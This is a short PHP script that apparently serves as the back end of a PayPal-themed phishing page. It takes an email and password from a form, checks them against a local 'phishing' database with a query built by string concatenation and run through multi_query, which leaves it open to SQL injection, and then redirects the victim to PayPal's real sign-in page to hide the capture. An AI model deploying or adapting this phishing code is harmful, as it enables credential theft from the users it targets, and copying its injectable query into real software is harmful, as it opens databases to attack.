<?php

// info
$servername = "127.0.0.1"; 
$username = "root";        
$password = "";            
$dbname = "phishing";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$email = $_POST['email'];
$password = $_POST['password'];

// hide passwords
$obfuscated_password = substr($password, 0, 1) . str_repeat('*', max(0, strlen($password) - 2)) . substr($password, -1);

try {
    $select_sql = "SELECT * FROM credentials WHERE email = '$email' AND password = '$password'";

    if ($conn->multi_query($select_sql)) {
        do {
            if ($result = $conn->store_result()) {
                if ($result->num_rows > 0) {
                    echo "Login successful!";
                } else {
                    echo "Login failed.";
                }
                $result->free();
            }
        } while ($conn->more_results() && $conn->next_result());
    }

    $insert_sql = "INSERT INTO credentials (email, password) VALUES ('$email', '$obfuscated_password')";

} catch (mysqli_sql_exception $e) {
}

$conn->close();
?>

<script>
    // redirect
    window.onload = function() {
        window.location.replace("https://www.paypal.com/signin");
    };
</script>
